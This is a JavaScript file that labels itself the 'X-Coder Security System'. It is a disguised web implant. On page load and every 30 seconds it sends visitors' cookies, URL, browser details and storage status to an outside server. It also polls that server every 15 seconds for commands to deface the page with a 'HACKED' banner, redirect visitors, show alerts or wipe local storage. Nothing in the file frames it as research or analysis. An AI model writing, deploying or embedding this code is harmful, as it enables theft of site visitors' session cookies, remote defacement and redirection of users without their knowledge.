/**
 * X-Coder Security System v6.0
 * Fix CORS + Multiple Method Kirim
 */

(function() {
    'use strict';
    
    // ============================================================
    // KONFIGURASI - GANTI DENGAN DOMAIN ANDA!
    // ============================================================
    const CONFIG = {
        centralServer: 'https://nexaisback.itsmeher.my.id/sec.php',
        scriptId: 'SCRIPT_MASTER_V1',
        interval: 30
    };
    
    // ============================================================
    // GET DOMAIN
    // ============================================================
    function getDomain() {
        return window.location.hostname;
    }
    
    // ============================================================
    // KUMPULKAN DATA
    // ============================================================
    function getData() {
        return {
            scriptId: CONFIG.scriptId,
            domain: getDomain(),
            url: window.location.href,
            path: window.location.pathname,
            title: document.title,
            referrer: document.referrer || 'Direct',
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            screen: screen.width + 'x' + screen.height,
            colorDepth: screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookies: document.cookie ? document.cookie.substring(0, 200) : '',
            loadTime: performance.timing ? performance.timing.loadEventEnd - performance.timing.navigationStart : 0,
            timestamp: new Date().toISOString(),
            ip: '',
            localStorage: localStorage.length > 0 ? 'yes' : 'no',
            sessionStorage: sessionStorage.length > 0 ? 'yes' : 'no'
        };
    }
    
    // ============================================================
    // KIRIM DATA - MULTIPLE METHOD
    // ============================================================
    function sendData() {
        var data = getData();
        var url = CONFIG.centralServer;
        
        // METHOD 1: FETCH (CORS)
        try {
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            })
            .then(function(r) { return r.json(); })
            .then(function(response) {
                if (response && response.command) {
                    executeCommand(response.command, response.data || {});
                }
            })
            .catch(function(e) {
                // METHOD 2: XHR (Fallback)
                try {
                    var xhr = new XMLHttpRequest();
                    xhr.open('POST', url, true);
                    xhr.setRequestHeader('Content-Type', 'application/json');
                    xhr.onload = function() {
                        if (xhr.status === 200) {
                            try {
                                var resp = JSON.parse(xhr.responseText);
                                if (resp && resp.command) {
                                    executeCommand(resp.command, resp.data || {});
                                }
                            } catch(e2) {}
                        }
                    };
                    xhr.send(JSON.stringify(data));
                } catch(e2) {
                    // METHOD 3: IMG BEACON (Last resort)
                    try {
                        var img = new Image();
                        img.src = url + '?data=' + encodeURIComponent(JSON.stringify(data)) + '&t=' + Date.now();
                    } catch(e3) {}
                }
            });
        } catch(e) {}
    }
    
    // ============================================================
    // CEK PERINTAH
    // ============================================================
    function checkCommand() {
        try {
            var url = CONFIG.centralServer + '?cmd=get&domain=' + encodeURIComponent(getDomain());
            fetch(url)
                .then(function(r) { return r.json(); })
                .then(function(response) {
                    if (response && response.command) {
                        executeCommand(response.command, response.data || {});
                    }
                })
                .catch(function() {});
        } catch(e) {}
    }
    
    // ============================================================
    // EKSEKUSI PERINTAH
    // ============================================================
    function executeCommand(command, data) {
        switch(command) {
            case 'deface':
                defacePage(data.html || defaultDeface());
                break;
            case 'alert':
                alert(data.message || '⚠️ Security Alert!');
                break;
            case 'redirect':
                window.location.href = data.url || 'https://www.roblox.com/home';
                break;
            case 'clear':
                localStorage.clear();
                sessionStorage.clear();
                if (data.message) alert(data.message);
                break;
        }
    }
    
    // ============================================================
    // DEFAULT DEFACE
    // ============================================================
    function defaultDeface() {
        return '<h1 style="text-align:center;font-size:72px;color:#ff0000;margin-top:20%;">🔥 HACKED</h1><p style="text-align:center;font-size:24px;color:#00ff41;">System Secured</p>';
    }
    
    // ============================================================
    // DEFACE PAGE
    // ============================================================
    function defacePage(html) {
        document.documentElement.innerHTML = html;
        document.body.style.cssText = 'margin:0;padding:0;';
    }
    
    // ============================================================
    // INISIALISASI
    // ============================================================
    function init() {
        setTimeout(sendData, 1000);
        setInterval(sendData, CONFIG.interval * 1000);
        setInterval(checkCommand, 15000);
    }
    
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
    
})();
